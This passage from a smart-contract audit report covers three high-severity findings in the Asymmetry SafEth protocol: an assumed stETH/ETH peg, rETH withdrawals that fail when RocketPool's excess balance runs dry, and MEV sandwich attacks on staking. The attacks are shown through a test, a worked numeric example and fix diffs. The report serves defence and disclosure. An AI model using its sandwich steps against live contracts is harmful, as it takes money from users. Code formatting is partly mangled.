+There are two different places in the codebase that indicate that the implementation is assuming a peg of 1 ETH ~= 1 stETH, each with different consequences. Even though both tokens have a tendency to keep the peg, this hasn’t been always the case as it can be seen inthis charthorthis dashboard. There have been many episodes of market volatility that affected the price of stETH, notably the one in last June when stETH traded at ~0.93 ETH.
+The first indication of such an assumption is the implementation ofethPerDerivative. This function is intended to work as an estimation of the current value in ETH of one unit (1e18) of the underlying asset. In this implementation, the function simply queries the amount of stETH for one unit (1e18) of wstETH and returns that value, which clearly indicates a conversion rate of 1 stETH = 1 ETH.
+https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L86-L88
+functionethPerDerivative(uint256_amount)publicviewreturns(uint256) {returnIWStETH(WST_ETH).getStETHByWstETH(10**18);}
+The other indication and most critical one is in thewithdrawfunction. This function is used by theSafEthcontract to unstake user positions and rebalance weights. In the implementation for theWstEthderivative, the function will unwrap the wstETH for stETH and use the Curve pool to exchange the stETH for ETH:
+https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67
+56:functionwithdraw(uint256_amount)externalonlyOwner{57:IWStETH(WST_ETH).unwrap(_amount);58:uint256stEthBal=IERC20(STETH_TOKEN).balanceOf(address(this));59:IERC20(STETH_TOKEN).approve(LIDO_CRV_POOL,stEthBal);60:uint256minOut= (stEthBal* (10**18-maxSlippage)) /10**18;61:IStEthEthPool(LIDO_CRV_POOL).exchange(1,0,stEthBal,minOut);62:// solhint-disable-next-line63:         (boolsent, ) =address(msg.sender).call{value:address(this).balance}(64:""65:         );66:require(sent,"Failed to send Ether");67:     }
+The issue is the calculation of theminOutvariable that is sent to the Curveexchangefunction to validate the output amount of the trade. As we can see in line 60, the calculation is simply applying the slippage percentage to stETH balance. This means that for example, given the default slippage value of 1%, trading 1 stETH will succeed only if the rate is above 0.99. Larger amounts will be more concerning as the Curve AMM implements non-linear invariants, the price impact will be bigger. TherebalanceToWeightsfunction withdrawsall the balancebefore rebalancing, which means it will try to swap all the stETH held by the contract.
+This could be mitigated by adjusting themaxSlippagevariable to allow for lower exchange rates. However this would imply additional issues. First, thesetMaxSlippageis an admin function that needs to be manually updated with extreme care. In times of high volatility the owners won’t be able to update this variable as frequently as needed to keep up with the exchange rate. This means that users that want to exit their position won’t be able to do so since the exchange for this derivative will fail (see PoC for a detailed example). Second, on the contrary, if the owners decide to set a higher slippage value by default to allow for unexpected market conditions, withdrawals and rebalancing (in particular) will be victim of sandwich attacks by MEV bots.
+Proof of Concept
+The following test replicates the market conditions during last June where stETH was trading at 0.93 ETH (needs to be forked from mainnet at block ~15000000). Here, the user wants to exit their position but the call tounstakewill revert since the exchange in the Curve pool will fail as the output amount will be less than the expected minimum.
+Note: the snippet shows only the relevant code for the test. Full test file can be foundhere.
+// Run this test forking mainnet at block height 15000000functiontest_WstEth_withdraw_AssumesPegToEth()public{// Setup derivativevm.prank(deployer);safEth.addDerivative(address(wstEth),1e18);// Deal balance to useruint256depositValue=1ether;vm.deal(user,depositValue);// user stakes ethervm.prank(user);safEth.stake{value:depositValue}();// user tries to unstake, action will fail due to stETH being prices at around 0.93-0.95 ETHuint256userShares=safEth.balanceOf(user);vm.prank(user);vm.expectRevert("Exchange resulted in fewer coins than expected");safEth.unstake(userShares);}
+Recommendation
+The user should be able to decide on the slippage and set the expected minimum output amount to correctly handle different market conditions and user expectations. Similar to how decentralized exchanges work, the user experience can be improved by using a front-end that queries current exchange rates and offers the user a preview of the estimated output amount.
+TheethPerDerivativefunction should also take into account the results of swapping the stETH for ETH using the Curve pool, similar to how theSfrxEthderivative implementation works.
+toshiSat (Asymmetry) confirmed
+Asymmetry mitigated:
+Using Chainlink to get price instead of assuming 1:1.
+Status:Not fully mitigated. Full details in reports fromadriroand0x52- and also shared below in theMitigation Reviewsection.
+
+[H-07]Reth.sol: Withdrawals are unreliable and depend on excessRocketDepositPoolbalance which can brick the whole protocol
+Submitted byHollaDieWaldfee, also found byMiloTruck,d3e4,HHK,0Kage,0xRobocop,0x52,adriro,igingu,Cryptor,carrotsmuggler, andToonVH
+The Asymmetry protocol promises that a user can callSafETH.unstakeat all times. What I mean by that is that a user should be able at all times to burn hisSafETHtokens and receiveETHin return. This requires that the derivatives held by the protocol can at all times be withdrawn (i.e. converted toETH).
+Also therebalanceToWeightsfunctionality requires that the derivatives can be withdrawn at all times. If a derivative cannot be withdrawn then therebalanceToWeightsfunction cannot be executed which means that the protocol cannot be adjusted to use different derivatives.
+For theWstEthandSfrxEthderivatives this is achieved by swapping the derivative in a Curve pool forETH. The liquidity in the respective Curve pool ensures that withdrawals can be processed at all times.
+TheRethderivative works differently.
+Withdrawals are made by calling theRocketTokenRETH.burnfunction:
+Link
+functionwithdraw(uint256amount)externalonlyOwner{// @audit this is how rETH is converted to ETHRocketTokenRETHInterface(rethAddress()).burn(amount);// solhint-disable-next-line(boolsent, ) =address(msg.sender).call{value:address(this).balance}("");require(sent,"Failed to send Ether");}
+The issue with this is that theRocketTokenRETH.burnfunction only allows forexcess balanceto be withdrawn. I.e. ETH that has been deposited by stakers but that is not yet staked on the Ethereum beacon chain. So Rocketpool allows users to burnrETHand withdrawETHas long as the excess balance is sufficient.
+The issue is obvious now: If there is no excess balance because enough users burnrETHor the Minipool capacity increases, the Asymmetry protocol is bascially unable to operate.
+Withdrawals are then impossible which bricksSafEth.unstakeandSafEth.rebalanceToWeights.
+Proof of Concept
+I show in this section how the current withdrawal flow for theRethderivative is dependend on there beingexcess balancein the RocketDepositPool.
+The current withdrawal flow callsRocketTokenRETH.burnwhich executes this code:
+Link
+functionburn(uint256_rethAmount)overrideexternal{// Check rETH amountrequire(_rethAmount>0,"Invalid token burn amount");require(balanceOf(msg.sender) >=_rethAmount,"Insufficient rETH balance");// Get ETH amountuint256ethAmount=getEthValue(_rethAmount);// Get & check ETH balanceuint256ethBalance=getTotalCollateral();require(ethBalance>=ethAmount,"Insufficient ETH balance for exchange");// Update balance & supply_burn(msg.sender,_rethAmount);// Withdraw ETH from deposit pool if requiredwithdrawDepositCollateral(ethAmount);// Transfer ETH to sendermsg.sender.transfer(ethAmount);// Emit tokens burned eventemitTokensBurned(msg.sender,_rethAmount,ethAmount,block.timestamp);}
+This executeswithdrawDepositCollateral(ethAmount):
+Link
+functionwithdrawDepositCollateral(uint256_ethRequired)private{// Check rETH contract balanceuint256ethBalance=address(this).balance;if(ethBalance>=_ethRequired) {return; }// WithdrawRocketDepositPoolInterfacerocketDepositPool=RocketDepositPoolInterface(getContractAddress("rocketDepositPool"));rocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance));}
+This then callsrocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance))to get theETHfrom theexcess balance:
+Link
+functionwithdrawExcessBalance(uint256_amount)overrideexternalonlyThisLatestContractonlyLatestContract("rocketTokenRETH", msg.sender) {// Load contractsRocketTokenRETHInterfacerocketTokenRETH=RocketTokenRETHInterface(getContractAddress("rocketTokenRETH"));RocketVaultInterfacerocketVault=RocketVaultInterface(getContractAddress("rocketVault"));// Check amountrequire(_amount<=getExcessBalance(),"Insufficient excess balance for withdrawal");// Withdraw ETH from vaultrocketVault.withdrawEther(_amount);// Transfer to rETH contractrocketTokenRETH.depositExcess{value:_amount}();// Emit excess withdrawn eventemitExcessWithdrawn(msg.sender,_amount,block.timestamp);}
+And this function reverts if theexcess balanceis insufficient which you can see in therequire(_amount <= getExcessBalance(), "Insufficient excess balance for withdrawal");check.
+Tools Used
+VSCode
+Recommended Mitigation Steps
+The solution for this issue is to have an alternative withdrawal mechanism in case theexcess balancein the RocketDepositPool is insufficient to handle the withdrawal.
+The alternative withdrawal mechanism is to sell therETHtokens via the Uniswap pool.
+You can use theRocketDepositPool.getExcessBalanceto check if there is sufficient excessETHto withdraw from Rocketpool or if the withdrawal must be made via Uniswap.
+The pseudocode of the new withdraw flow looks like this:
+function withdraw(uint256 amount) external onlyOwner {if (rocketDepositPool excess balance is sufficient) {RocketTokenRETHInterface(rethAddress()).burn(amount);// solhint-disable-next-line(bool sent, ) = address(msg.sender).call{value: address(this).balance}("");require(sent, "Failed to send Ether");} else {// swap rETH for ETH via Uniswap pool}}
+I also wrote the code for the changes that I suggest:
+diff --git a/contracts/SafEth/derivatives/Reth.sol b/contracts/SafEth/derivatives/Reth.solindex b6e0694..b699d5c 100644--- a/contracts/SafEth/derivatives/Reth.sol+++ b/contracts/SafEth/derivatives/Reth.sol@@ -105,11 +105,24 @@ contract Reth is IDerivative, Initializable, OwnableUpgradeable {@notice - Convert derivative into ETH*/function withdraw(uint256 amount) external onlyOwner {-        RocketTokenRETHInterface(rethAddress()).burn(amount);-        // solhint-disable-next-line-        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(-            ""-        );+        if (canWithdrawFromRocketPool(amount)) {+            RocketTokenRETHInterface(rethAddress()).burn(amount);+            // solhint-disable-next-line+        } else {++            uint256 minOut = ((((poolPrice() * amount) / 10 ** 18) *+                ((10 ** 18 - maxSlippage))) / 10 ** 18);++            IWETH(W_ETH_ADDRESS).deposit{value: msg.value}();+            swapExactInputSingleHop(+                rethAddress(),+                W_ETH_ADDRESS,+                500,+                amount,+                minOut+            );+        }+        (bool sent, ) = address(msg.sender).call{value: address(this).balance}("");require(sent, "Failed to send Ether");}@@ -149,6 +162,21 @@ contract Reth is IDerivative, Initializable, OwnableUpgradeable {_amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit();}+    function canWithdrawFromRocketPool(uint256 _amount) private view returns (bool) {+        address rocketDepositPoolAddress = RocketStorageInterface(+            ROCKET_STORAGE_ADDRESS+        ).getAddress(+                keccak256(+                    abi.encodePacked("contract.address", "rocketDepositPool")+                )+            );+        RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(+                rocketDepositPoolAddress+            );+        uint256 _ethAmount = RocketTokenRETHInterface(rethAddress()).getEthValue(_amount);+        return rocketDepositPool.getExcessBalance() >= _ethAmount;+    }+
+toshiSat (Asymmetry) confirmed, but disagreed with severity and commented:
+The deposit pool is mostly always full, but the warden does have a point and we should allow for multiple options.
+Asymmetry mitigated:
+Check if withdraw from deposit contract possible.
+Status:Sub-optimally mitigated. Full details in reports fromd3e4,adriro, and0x52.
+
+[H-08] Staking, unstaking and rebalanceToWeight can be sandwiched (Mainly rETH deposit)
+Submitted byHHK, also found bynowonder92,ernestognw,MiloTruck,tank,ulqiorra,ulqiorra,ulqiorra,Toshii,wen,pontifex,shuklaayush,nemveer,shuklaayush,carlitox477,skidog,Viktor_Cortess,0xepley,0xepley,kaden,nemveer,0xTraub,teddav,n1punp,shalaamum,auditor0517,handsomegiraffe,MadWookie,0xfusion,0xRobocop,CodeFoxInc,jasonxiale,deliriusz,0Kage,bytes032,yac,bearonbike,Shogoki,Bahurum,0x52,Lirios,IgorZuk,RedTiger,0xl51,BanPaleo,wait,019EC6E2,m_Rassska,peanuts,RedTiger,SaeedAlipoor01988,0xbepresent,fs0c,HollaDieWaldfee,a3yip6,Bauer,rvierdiiev,UdarTeam,top1st,Ruhum,aviggiano,aviggiano,roelio,rvierdiiev,igingu,Dug,koxuan,4lulz,carrotsmuggler,carrotsmuggler,ToonVH,chalex,SunSec, andlatt1ce
+https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L63-L101https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L228-L245https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170-L183https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L56-L66https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L108-L128https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74-L75
+Impact
+rETH derivative can be bought through uniswap if the deposit contract is not open.
+While a maxSlippage variable is set, the price of rETH on uniswap is the spot price and is only determined during the transaction opening sandwich opportunity for MEV researchers as long as the slippage stays below maxSlippage.
+This is also true for WstETH (on withdraw) and frxETH (on deposit and withdraw) that go through a curve pool when unstaking (and staking for frxETH). While the curve pool has much more liquidity and the assumed price is a 1 - 1 ratio for WstETH and frxETH seem to be using a twap price before applying the slippage, these attacks are less likely to happen so I will only describe rETH.
+Proof of Concept
+While the current rETH derivative contract uses uniswapv3 0,05% pool, I’ll be using the uniswapv2 formula (https://amm-calculator.vercel.app/) to make this example simplier, in both case sandwiching is possible.
+Default slippage is set to 1% on rETH contract at deployment. (see:https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L44)
+Let’s take a pool of 10,000 rETH for 10,695 eth (same ratio is on the univ3 0,05% pool on the 26th of march).
+User wants to stake 100ETH, a third of it will be staked through rETH according to a 1/3 weight for each derivative.
+Bundle:
+TX1:
+Researcher swap 100 ETH in for 92.63 rETHnew pool balance: 9907.36 rETH - 10795 ETH
+TX2:
+User stake his ETH, the rocketPool deposit contract is close so the deposit function takes the current spot price of the pool and then applies 1% slippage to it to get minOut.
+Current ratio: eth = 0.9177 rETHETH to swap for reth: 33.3333~So minOut -> 33.3333 * 0.9177 * 0.99 = 30.284 rETH
+(see:https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170-L183)
+Contract swap 33.3333 ETH for 30.498 rETH (slippage of 0.61% so below 1% and received more than minOut)
+New pool balance: 9876.86 rETH - 10828.33 ETH
+TX3:
+Researcher swap back the 92.63 rETH in for 100.61~ ETHnew pool balance: 9969.49 rETH - 10727.72 ETH
+Researcher made 0.61~ ETH of profit, could be more as we only applied a 0,61% slippage but we can go as far as 1% in the current rETH contract.
+Univ3 pool would could even worse as Researcher with a lot of liquidity could be able to drain one side (liquidity is very concentrated), add liquidity in a tight range execute the stake and then remove liquidity and swap back.
+Recommended Mitigation Steps
+The rETH price should be determined using the TWAP price and users should be able to input minOut in the stake, unstake and rebalanceToWeight function.
+Picodes (judge) increased severity to High
+Asymmetry mitigated:
+Using Chainlink to get price instead of poolPrice.
+Status:Mitigation confirmed with comments. Full details in reports fromd3e4,adriro, and0x52.
+
